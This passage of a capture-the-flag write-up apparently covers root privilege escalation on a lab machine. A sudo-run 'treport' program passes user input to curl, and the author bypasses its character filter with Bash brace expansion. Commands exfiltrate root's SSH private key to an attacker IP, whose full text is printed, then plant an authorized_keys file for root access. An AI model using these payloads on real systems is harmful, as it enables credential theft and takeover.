+            <span class=mtk5>elif</span> <span class=mtk1>choice</span> <span class=mtk5>==</span> <span class=mtk6>4</span><span class=mtk1>:</span>
+                <span class=mtk1>check</span> <span class=mtk5>=</span> <span class=mtk6>False</span>
+            <span class=mtk5>else</span><span class=mtk1>:</span>
+                <span class=mtk8>print</span><span class=mtk1>(</span><span class=mtk4>'Wrong</span> <span class=mtk4>input.'</span><span class=mtk1>)</span>
+</code></pre></div><p>If we read the four existing methods:</p><ul><li><code>list_files</code> does not seem to be vulnerable</li><li><code>read_file</code> appears to have a good filter for <code>../</code></li><li><code>create</code> also appears to have a good filter for <code>../</code></li><li><code>download</code> has a list of bad characters, but also a system command with user input being concatenated</li></ul><p>Clearly, the most vulnerable method is <code>download</code>. Let&rsquo;s take a look to the bad characters:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk1>[</span><span class=mtk4>'`'</span><span class=mtk1>,</span> <span class=mtk4>';'</span><span class=mtk1>,</span> <span class=mtk4>'&amp;'</span><span class=mtk1>,</span> <span class=mtk4>'|'</span><span class=mtk1>,</span> <span class=mtk4>'&gt;'</span><span class=mtk1>,</span> <span class=mtk4>'&lt;'</span><span class=mtk1>,</span> <span class=mtk4>'?'</span><span class=mtk1>,</span> <span class=mtk4>"'"</span><span class=mtk1>,</span> <span class=mtk4>'@'</span><span class=mtk1>,</span> <span class=mtk4>'#'</span><span class=mtk1>,</span> <span class=mtk4>'$'</span><span class=mtk1>,</span> <span class=mtk4>'%'</span><span class=mtk1>,</span> <span class=mtk4>'^'</span><span class=mtk1>,</span> <span class=mtk4>'('</span><span class=mtk1>,</span> <span class=mtk4>')'</span><span class=mtk1>]</span>  
+</code></pre></div><p>Actually, it might be easier to show the non-bad characters (skipping ASCII letters and numbers):</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk1>[</span><span class=mtk4>'{'</span><span class=mtk1>,</span> <span class=mtk4>'}'</span><span class=mtk1>,</span> <span class=mtk4>','</span><span class=mtk1>,</span> <span class=mtk4>'.'</span><span class=mtk1>,</span> <span class=mtk4>'['</span><span class=mtk1>,</span> <span class=mtk4>']'</span><span class=mtk1>,</span> <span class=mtk4>'-'</span><span class=mtk1>,</span> <span class=mtk4>'+'</span><span class=mtk1>,</span> <span class=mtk4>':'</span><span class=mtk1>,</span> <span class=mtk4>'"'</span><span class=mtk1>,</span> <span class=mtk4>'/'</span><span class=mtk1>,</span> <span class=mtk4>'*'</span><span class=mtk1>]</span>  
+</code></pre></div><p>Notice that we cannot use spaces because there is a regular expression that matches any white space:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk1>res</span> <span class=mtk5>=</span> <span class="mtk8 mtku">bool</span><span class=mtk1>(</span><span class="mtk8 mtku">re</span><span class=mtk1>.</span><span class=mtk8>search</span><span class=mtk1>(</span><span class=mtk4>'</span><span class=mtk6>\\</span><span class=mtk4>s'</span><span class=mtk1>,</span> <span class=mtk1>ip</span><span class=mtk1>))</span>  
+</code></pre></div><p>Let&rsquo;s see what we can do with these non-bad characters.</p><h2 id=privilege-escalation-with-sudo>Privilege escalation with <code>sudo</code></h2><p>As shown previously, the user <code>code</code> is able to run <code>/usr/bin/treport</code> as <code>root</code> using <code>sudo</code>. So, every action in this context will be done as <code>root</code>.</p><p>The program <code>treport</code> is using <code>curl</code> to handle the threat report download. It can be seen in the source code or entering <code>127.0.0.1</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>code@code</span>:<span class=code-blue>~</span>$ sudo /usr/bin/treport
+1.Create Threat Report.
+2.Read Threat Report.
+3.Download A Threat Report.
+4.Quit.
+Enter your choice:3
+Enter the IP/file_name:127.0.0.1
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current  
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  2078  100  2078    0     0   405k      0 --:--:-- --:--:-- --:--:--  405k
+</code></pre></div><p>The output of <code>curl</code> is shown. Actually, we can pass nothing and see a <code>curl</code> error:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>code@code</span>:<span class=code-blue>~</span>$ sudo /usr/bin/treport
+1.Create Threat Report.
+2.Read Threat Report.
+3.Download A Threat Report.
+4.Quit.
+Enter your choice:3
+Enter the IP/file_name:
+curl: no URL specified!
+curl: try 'curl --help' or 'curl --manual' for more information  
+</code></pre></div><p>And even show the help panel of <code>curl</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>code@code</span>:<span class=code-blue>~</span>$ sudo /usr/bin/treport
+1.Create Threat Report.
+2.Read Threat Report.
+3.Download A Threat Report.
+4.Quit.
+Enter your choice:3
+Enter the IP/file_name:--help
+Usage: curl [options...] &lt;url&gt;
+     --abstract-unix-socket &lt;path&gt; Connect via abstract Unix domain socket  
+     --alt-svc &lt;file name&gt; Enable alt-svc with this cache file
+     --anyauth       Pick any authentication method
+ -a, --append        Append to target file when uploading
+     --basic         Use HTTP Basic Authentication
+     --cacert &lt;file&gt; CA certificate to verify peer against
+     --capath &lt;dir&gt;  CA directory to verify peer against
+...
+</code></pre></div><p>Taking into account that we can use <code>{</code>, <code>}</code> and <code>,</code>, we can use them as &ldquo;spaces&rdquo; because it works in Bash.</p><p>For example, this command:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> {10.10.17.44,-T,/root/.ssh/id_rsa} -o /root/reports/threat_report_HH_MM_SS  
+</code></pre></div><p>Is equivalent to:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> 10.10.17.44 -T /root/.ssh/id_rsa -o /root/reports/threat_report_HH_MM_SS  
+</code></pre></div><p>Using this payload, we can transfer the SSH private key of <code>root</code> to our machine (<code>-T</code> is used in <code>curl</code> to upload the contents of a file with a PUT request). For that, let&rsquo;s use <code>nc</code> to listen on port 80 (HTTP), and put the payload in <code>treport</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>code@code</span>:<span class=code-blue>~</span>$ sudo /usr/bin/treport
+1.Create Threat Report.
+2.Read Threat Report.
+3.Download A Threat Report.
+4.Quit.
+Enter your choice:3
+Enter the IP/file_name:{10.10.17.44,-T,/root/.ssh/id_rsa}
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current  
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  2590    0     0  100  2590      0   1257  0:00:02  0:00:02 --:--:--  1257
+</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>nc</span> -nlvp 80
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::80
+Ncat: Listening on 0.0.0.0:80
+Ncat: Connection from 10.10.11.126.
+Ncat: Connection from 10.10.11.126:33912.
+PUT /id_rsa HTTP/1.1
+Host: 10.10.17.44
+User-Agent: curl/7.68.0
+Accept: */*
+Content-Length: 2590
+Expect: 100-continue
+
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+a5BI6W1lTZzjUAAAAJcm9vdEBjb2RlAQI=
+-----END OPENSSH PRIVATE KEY-----
+</code></pre></div><p>Unexpectedly, this SSH private key does not work. One could transfer the <code>root.txt</code> flag in a similar way.</p><p>However, if we want to get a shell as <code>root</code>, we have two options since we can output files using <code>curl</code> (write permissions as <code>root</code>):</p><ol><li>Modify <code>/etc/passwd</code> in order to change the password for the <code>root</code> user</li><li>Upload an SSH public key into <code>/root/.ssh/authorized_keys</code></li></ol><p>This time, I decided to use the second option. For that, we must generate SSH keys and expose the public one with a Python web server:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>ssh-keygen</span>
+Generating public/private rsa key pair.
+Enter file in which to save the key (~/.ssh/id_rsa): ./id_rsa  
+Enter passphrase (empty for no passphrase):
+Enter same passphrase again:
+Your identification has been saved in ./id_rsa
+Your public key has been saved in ./id_rsa.pub
+The key fingerprint is:
+SHA256:i1sUXxdZ0+4pw/Y7Tv0KW/DwqgFdCCZhJTmpJ32a6Pk
+The key's randomart image is:
++---[RSA 3072]----+
+|      ==+     .+o|
+|     .++ . .  ..o|
+|     o .. . o .. |
+|    o o .+ o .  .|
+|     + +S o +  ..|
+|    . oo o   X .o|
+|   . .. o . o B..|
+|    o  o   . =.o.|
+|     .E   ..o o++|
++----[SHA256]-----+
+
+<span class=code-cyan>$</span> <span class=code-dark-green>python</span> -m http.server 80
+Serving HTTP on :: port 80 (http://[::]:80/) ...
+</code></pre></div><p>Then, using <code>treport</code> we can request the public key (<code>id_rsa.pub</code>) and save it to <code>/root/.ssh/authorized_keys</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>code@code</span>:<span class=code-blue>~</span>$ sudo /usr/bin/treport
+1.Create Threat Report.
+2.Read Threat Report.
+3.Download A Threat Report.
+4.Quit.
+Enter your choice:3
+Enter the IP/file_name:{10.10.17.44/id_rsa.pub,-o,/root/.ssh/authorized_keys}
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current  
+                                 Dload  Upload   Total   Spent    Left  Speed
+100   553  100   553    0     0   2323      0 --:--:-- --:--:-- --:--:--  2323
+</code></pre></div><p>Finally, we can access as <code>root</code> especifying our private key (<code>id_rsa</code>) without password:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>ssh</span> -i <span class=mtku>id_rsa</span> root@10.10.11.126  
+root@code:~# cat root.txt
+3eb081061035fcd241f3e389d991f146
+</code></pre></div><div class="mt6 instapaper_ignoref"></div></div><aside aria-label=aside class="w-20-l mt6-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style=position:sticky;top:5rem><p class="f5 b mb3">Contents of this write-up</p><nav id=TableOfContents><ul><li><a href=#port-scanning>Port scanning</a></li><li><a href=#web-enumeration>Web enumeration</a></li><li><a href=#forging-a-jwt-token>Forging a JWT token</a></li><li><a href=#exploiting-a-directory-path-traversal>Exploiting a Directory Path Traversal</a></li><li><a href=#system-enumeration>System enumeration</a></li><li><a href=#reversing-treport-to-python-code>Reversing <code>treport</code> to Python code</a></li><li><a href=#privilege-escalation-with-sudo>Privilege escalation with <code>sudo</code></a></li></ul></nav></div></aside></article></main><footer class="bg-black bottom-0 w-100 pa3" role=contentinfo><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href=https://7rocky.github.io/ title=https://7rocky.github.io/>&copy; 7Rocky 2022</a><div style=margin-top:8px><div><div><a href=https://www.linkedin.com/in/roberto-gesteira-minarro/ target=_blank class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel=noopener aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href=https://github.com/7Rocky target=_blank class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel=noopener aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></footer></body></html>
